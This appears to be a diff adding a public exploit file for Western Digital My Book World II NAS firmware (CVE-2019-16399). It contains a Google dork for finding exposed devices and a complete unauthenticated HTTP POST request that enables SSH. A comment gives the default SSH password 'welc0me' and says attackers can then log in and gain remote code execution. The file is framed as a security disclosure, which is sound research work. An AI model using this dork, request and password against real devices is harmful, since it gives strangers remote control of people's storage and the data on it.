@@ -1,0 +1,25 @@
+# Exploit Title: Western Digital My Book World II NAS <= 1.02.12 - Broken Authentication to RCE
+# Google Dork: intitle:"My Book World Edition - MyBookWorld"
+# Date: 19th Sep, 2019
+# Exploit Author: Noman Riffat, National Security Services Group (NSSG)
+# Vendor Homepage: https://wd.com/
+# Software Link: https://support.wdc.com/downloads.aspx?p=130&lang=en
+# Version: <= 1.02.12
+# Tested on: Firmware
+# CVE : CVE-2019-16399
+POST /admin/system_advanced.php?lang=en HTTP/1.1
+Host: x.x.x.x
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+Content-Length: 241
+orig_ssl_key=&orig_ssl_certificate=&submit_type=ssh&current_ssh=&enablessh=yes&Submit=Submit&ssl_certificate=Paste+a+signed+certificate+in+X.509+PEM+format+here.&ssl_key=Paste+a+RSA+private+key+in+PEM+format+here.&hddstandby=on&ledcontrol=on
+/*
+The default password for SSH is 'welc0me' and the only security measure preventing SSH Login is the disabled SSH Port and it can be enabled with above POST Header. The attacker can then login to SSH Port with default password. WD My Book World II NAS is very outdated hardware and Western Digitial may never release update for it. It is still using PHP 4 so it has more potential of Remote Exploits. All firmwares listed at https://support.wdc.com/downloads.aspx?p=130&lang=en are vulnerable.
+There is no update coming probably and if you want to remain safe, abandon this NAS and switch to the latest hardware.
+*/
+Security Researcher - Noman Riffat, National Security Services Group (NSSG)
+@nomanriffat, @nssgoman
